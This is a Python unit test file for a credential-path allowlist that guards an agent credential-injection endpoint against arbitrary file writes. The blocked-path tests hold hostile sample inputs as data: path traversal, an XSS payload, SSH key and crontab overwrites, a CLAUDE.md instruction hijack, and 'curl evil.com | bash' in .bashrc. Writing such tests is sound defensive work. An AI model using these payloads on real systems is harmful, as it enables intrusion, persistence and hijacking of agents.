"""
Unit tests for credential injection file path allowlist (#183).

Verifies that only approved credential file paths can be injected into agents.
Prevents arbitrary file write via parameter tampering on POST /api/agents/{name}/credentials/inject.

Module: src/backend/routers/credentials.py (backend), docker/base-image/agent_server/routers/credentials.py (agent)
Issue: https://github.com/abilityai/trinity/issues/183
"""

import pytest

# ---- Inline reimplementation of validation logic for unit testing ----
# Mirrors the allowlist check in both backend and agent-side routers.

ALLOWED_CREDENTIAL_PATHS = {".env", ".mcp.json", ".mcp.json.template", ".credentials.enc"}


def validate_credential_paths(files: dict) -> list:
    """Return list of disallowed paths. Empty list means all paths are valid."""
    return [p for p in files if p not in ALLOWED_CREDENTIAL_PATHS]


# ---- Tests: Allowed paths ----

class TestAllowedPaths:
    """Paths that MUST be accepted."""

    def test_env_file(self):
        assert validate_credential_paths({".env": "KEY=value"}) == []

    def test_mcp_json(self):
        assert validate_credential_paths({".mcp.json": "{}"}) == []

    def test_mcp_json_template(self):
        assert validate_credential_paths({".mcp.json.template": "${VAR}"}) == []

    def test_credentials_enc(self):
        assert validate_credential_paths({".credentials.enc": "encrypted-data"}) == []

    def test_multiple_valid_files(self):
        files = {
            ".env": "KEY=val",
            ".mcp.json": "{}",
            ".credentials.enc": "data",
        }
        assert validate_credential_paths(files) == []


# ---- Tests: Blocked paths ----

class TestBlockedPaths:
    """Paths that MUST be rejected."""

    def test_arbitrary_html_file(self):
        """Exact pentest reproduction: /hello/anyfile.html"""
        disallowed = validate_credential_paths({"/hello/anyfile.html": "<img src onerror=prompt(11)>"})
        assert disallowed == ["/hello/anyfile.html"]

    def test_path_traversal_etc_passwd(self):
        disallowed = validate_credential_paths({"../../etc/passwd": "root:x:0:0"})
        assert disallowed == ["../../etc/passwd"]

    def test_absolute_path(self):
        disallowed = validate_credential_paths({"/etc/crontab": "* * * * * evil"})
        assert disallowed == ["/etc/crontab"]

    def test_authorized_keys(self):
        disallowed = validate_credential_paths({".ssh/authorized_keys": "ssh-rsa AAAA..."})
        assert disallowed == [".ssh/authorized_keys"]

    def test_claude_md_overwrite(self):
        disallowed = validate_credential_paths({"CLAUDE.md": "# hijacked instructions"})
        assert disallowed == ["CLAUDE.md"]

    def test_bashrc_overwrite(self):
        disallowed = validate_credential_paths({".bashrc": "curl evil.com | bash"})
        assert disallowed == [".bashrc"]

    def test_random_subdirectory(self):
        disallowed = validate_credential_paths({"subdir/config.json": "{}"})
        assert disallowed == ["subdir/config.json"]

    def test_dot_env_in_subdirectory(self):
        """.env is allowed, but subdir/.env is not."""
        disallowed = validate_credential_paths({"config/.env": "KEY=val"})
        assert disallowed == ["config/.env"]


# ---- Tests: Mixed valid + invalid ----

class TestMixedPaths:
    """Requests with both valid and invalid paths should be rejected."""

    def test_mixed_valid_and_invalid(self):
        files = {
            ".env": "KEY=val",
            "../../etc/passwd": "root:x:0:0",
        }
        disallowed = validate_credential_paths(files)
        assert "../../etc/passwd" in disallowed
        assert ".env" not in disallowed

    def test_all_invalid(self):
        files = {
            "/tmp/evil.sh": "#!/bin/bash",
            "CLAUDE.md": "# hijacked",
        }
        disallowed = validate_credential_paths(files)
        assert len(disallowed) == 2


# ---- Tests: Edge cases ----

class TestEdgeCases:
    """Boundary and edge-case inputs."""

    def test_empty_files_dict(self):
        assert validate_credential_paths({}) == []

    def test_env_with_leading_slash(self):
        """/.env is NOT the same as .env — must be rejected."""
        disallowed = validate_credential_paths({"/.env": "KEY=val"})
        assert disallowed == ["/.env"]

    def test_env_with_trailing_space(self):
        disallowed = validate_credential_paths({".env ": "KEY=val"})
        assert disallowed == [".env "]

    def test_case_sensitivity(self):
        """.ENV is not .env — must be rejected."""
        disallowed = validate_credential_paths({".ENV": "KEY=val"})
        assert disallowed == [".ENV"]

    def test_null_byte_in_path(self):
        disallowed = validate_credential_paths({".env\x00.txt": "KEY=val"})
        assert len(disallowed) == 1
